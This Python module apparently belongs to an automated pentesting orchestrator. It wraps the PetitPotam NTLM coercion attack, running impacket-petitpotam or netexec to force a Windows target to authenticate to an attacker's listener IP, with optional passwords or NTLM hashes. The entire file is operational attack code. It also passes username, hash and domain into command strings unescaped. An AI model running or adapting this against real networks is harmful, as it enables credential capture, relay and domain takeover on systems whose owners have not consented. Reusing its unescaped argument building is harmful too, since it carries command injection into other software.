import logging
import shlex

from orchestrator.kali_tools_client import kali

logger = logging.getLogger("ad_petitpotam")


class PetitPotam:
    async def coerce(self, target: str, listener: str = "",
                     username: str = "", password: str = "",
                     hash: str = "", domain: str = "",
                     timeout: int = 120) -> dict:
        if not listener:
            return {"success": False, "error": "listener (attacker IP) required"}
        args = f"-target {target} -listener {listener}"
        if username:
            args += f" -u {username}"
        if password:
            args += f" -p {shlex.quote(password)}"
        if hash:
            args += f" -hashes {hash}"
        if domain:
            args += f" -d {domain}"
        result = await kali.run("impacket-petitpotam", args, timeout=timeout)
        stdout = (result.get("stdout") or "") + (result.get("stderr") or "")
        success = "captured" in stdout.lower() or result.get("returncode") == 0
        return {
            "success": success,
            "target": target,
            "listener": listener,
            "output": stdout[:3000],
            "error": result.get("stderr", "")[:1000] if not success else "",
        }

    async def coerce_via_netexec(self, target: str, listener: str,
                                  username: str = "", password: str = "",
                                  domain: str = "", timeout: int = 60) -> dict:
        args = f"smb {target} -M petitpotam -o LISTENER={listener}"
        if username:
            args += f" -u {username}"
        if password:
            args += f" -p {shlex.quote(password)}"
        if domain:
            args += f" -d {domain}"
        result = await kali.run("netexec", args, timeout=timeout)
        stdout = (result.get("stdout") or "") + (result.get("stderr") or "")
        success = "captured" in stdout.lower() or result.get("returncode") == 0
        return {
            "success": success, "method": "netexec",
            "target": target, "output": stdout[:3000],
            "error": result.get("stderr", "")[:1000] if not success else "",
        }
